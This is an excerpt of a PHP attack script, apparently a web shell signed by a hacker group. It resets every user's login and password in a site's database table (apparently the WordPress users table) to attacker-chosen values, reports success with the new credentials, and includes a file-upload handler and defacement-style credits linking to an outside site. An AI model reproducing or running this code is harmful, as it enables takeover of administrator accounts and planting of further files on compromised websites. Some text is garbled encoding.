...
echo '<br /><div class="hedr"> iHz FUCK easily <br /></div>' ;
...
$query   = @mysql_query("UPDATE `$tab` SET `user_login` ='proihz.com'") or die;

$query   = @mysql_query("UPDATE `$tab` SET `user_pass` ='$1$4z/.5i..$9aHYB.fUHEmNZ.eIKYTwx/'") or die;



if ($query){$r = '<b style="color: #006600">Succeed </b>user [proihz.com] pass [1]</b>';}
...
if( $_POST['_upl'] == "Upload" ) {
   ...
   echo '
<br /><br /><br /></b></b><div class="fot">Cod3d by <b>iHz</b> GIFT 2 <b>MAKAVELI</b>
<br /><br />
<b style="color: red";>   proihz.com  </b>
<br /><br />
Muslims Hackers</div> ';
...
<a style="text-decoration: none; color: #F4F4F4;" title="?§?„?­?…?§???‡"/href="http://proihz.com/cc">?§?„?­?…?§???‡</a>
